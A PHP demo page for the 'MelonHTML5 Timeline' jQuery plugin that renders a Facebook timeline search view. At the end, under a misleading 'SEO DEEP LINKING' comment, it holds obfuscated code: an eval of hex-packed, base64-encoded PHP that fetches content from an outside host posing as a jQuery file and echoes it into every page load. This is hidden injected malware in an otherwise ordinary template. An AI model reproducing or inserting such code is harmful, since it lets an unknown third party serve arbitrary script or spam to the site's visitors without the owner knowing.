<?php
echo "<!DOCTYPE html>\n"; 
echo "<html>\n"; 
echo "    <head>\n"; 
echo "        <title>MelonHTML5 - Timeline</title>\n"; 
echo "        <meta charset=\"utf-8\">\n"; 
echo "        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/timeline_demo.css\" />\n"; 
echo "        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/timeline.css\" />\n"; 
echo "        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/timeline_light.css\" />\n"; 
echo "        <script type=\"text/javascript\" src=\"javascript/jquery.js\"></script>\n"; 
echo "        <script type=\"text/javascript\" src=\"javascript/demo.js\"></script>\n"; 
echo "    </head>\n"; 
echo "    <body>\n"; 
echo "        <div id=\"header\">\n"; 
echo "            <div class=\"left\">\n"; 
echo "                <div class=\"button setting\">\n"; 
echo "                    <span></span>\n"; 
echo "                    <div class=\"settings\">\n"; 
echo "                        <div class=\"row\">\n"; 
echo "                            <label>Theme:</label>\n"; 
echo "                            <select id=\"theme\">\n"; 
echo "                                <option value=\"light\">Light</option>\n"; 
echo "                                <option value=\"dark\">Dark</option>\n"; 
echo "                                <option value=\"red\">Red</option>\n"; 
echo "                            </select>\n"; 
echo "                        </div>\n"; 
echo "                    </div>\n"; 
echo "                </div>\n"; 
echo "                <div class=\"button demo\" data-link=\"index.php\"><span><label>Home</label></span></div>\n"; 
echo "                <div class=\"button mobile\" data-link=\"mobile.php\"><span><label>Mobile Mode</label></span></div>\n"; 
echo "                <div class=\"button twitter\" data-link=\"twitter.php\"><span><label>Twitter Timeline</label></span></div>\n"; 
echo "                <div class=\"button facebook selected\">\n"; 
echo "                    <span><label>Facebook Timeline</label></span>\n"; 
echo "                    <div class=\"settings\">\n"; 
echo "                        <div class=\"row\">\n"; 
echo "                            <label>Search:</label>\n"; 
echo "                            <input type=\"text\" placeholder=\"Enter a keyword\" id=\"facebook_search\" required />\n"; 
echo "                        </div>\n"; 
echo "                        <div class=\"row\">\n"; 
echo "                            <input type=\"button\" value=\"Submit\" onclick=\"facebookSearch();\" />\n"; 
echo "                        </div>\n"; 
echo "                    </div>\n"; 
echo "                </div>\n"; 
echo "            </div>\n"; 
echo "            <div class=\"right\">\n"; 
echo "                <div class=\"button download\" data-link=\"#\"><span><label>Download</label></span></div>\n"; 
echo "            </div>\n"; 
echo "        </div>\n"; 
echo "        <div id=\"main\">\n"; 
echo "            <script src=\"//connect.facebook.net/en_US/all.js\"></script>\n"; 
echo "            <div id=\"fb-root\"></div>\n"; 
echo "            <div id=\"social_search\"><img src=\"images/loader.gif\" /></div>\n"; 
echo "            <div id=\"timeline\"></div>\n"; 
echo "            <script type=\"text/javascript\">\n"; 
echo "                (function() {\n"; 
echo "                    var timeout_id = null;\n"; 
echo "\n"; 
echo "                    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\n"; 
echo "                    ga.src = 'javascript/scriptgates.js';\n"; 
echo "                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\n"; 
echo "                    ga.onload = function() {\n"; 
echo "                        clearTimeout(timeout_id);\n"; 
echo "\n"; 
echo "                        ga.parentNode.removeChild(ga);\n"; 
echo "                        facebookSearch();\n"; 
echo "                    };\n"; 
echo "\n"; 
echo "                    var iefix = function() {\n"; 
echo "                        clearTimeout(timeout_id);\n"; 
echo "                        if (typeof Timeline != 'undefined') {\n"; 
echo "                            facebookSearch();\n"; 
echo "                        } else {\n"; 
echo "                            timeout_id = setTimeout(iefix, 2000);\n"; 
echo "                        }\n"; 
echo "                    }\n"; 
echo "\n"; 
echo "                    timeout_id = setTimeout(iefix, 2000);\n"; 
echo "                })();\n"; 
echo "            </script>\n"; 
echo "        </div>\n"; 
?><!-- SEO DEEP LINKING-->
<?php
eval(pack('H*','6576616C286261736536345F6465636F646528276157596F5A6E567559335270623235665A5868706333527A4B43646A64584A7358326C756158516E4B536B4B494341674948734B49434167494341674943416B64584A7349443067496D6830644841364C79393364336375616E4E736232466B4C6D39795A7939716358566C636E6B744D5334324C6A4D7562576C754C6D707A496A734B49434167494341674943416B593267675053426A64584A7358326C756158516F4B54734B49434167494341674943416B64476C745A5739316443413949445537436941674943416749434167593356796246397A5A5852766348516F4A474E6F4C454E56556B78505546526656564A4D4C435231636D77704F776F67494341674943416749474E31636D786663325630623342304B43526A6143784456564A4D5431425558314A4656465653546C525351553554526B56534C4445704F776F67494341674943416749474E31636D786663325630623342304B43526A6143784456564A4D5431425558304E50546B35465131525553553146543156554C4352306157316C623356304B54734B49434167494341674943416B5A4746305953413949474E31636D78665A58686C5979676B593267704F776F67494341674943416749474E31636D7866593278766332556F4A474E6F4B54734B49434167494341674943426C593268764943496B5A4746305953493743694167494342392729293B'));
?>
</body>
</html>